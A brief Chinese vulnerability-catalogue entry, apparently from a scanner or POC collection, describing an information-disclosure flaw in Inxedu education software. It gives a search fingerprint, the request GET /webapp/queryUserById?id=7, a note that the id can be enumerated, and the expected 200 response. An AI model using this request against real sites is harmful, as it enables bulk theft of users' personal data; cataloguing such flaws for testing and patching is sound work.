# 因酷教育软件queryUserById存在信息泄露漏洞

因酷教育软件 ｜ 信息泄露 ｜ —
- **指纹**：`body="/image/keupload?"`
- **请求**：`GET /webapp/queryUserById?id=7 HTTP/1.1`

**Payload**
```
Id可遍历
Host:
```
- **响应特征**：200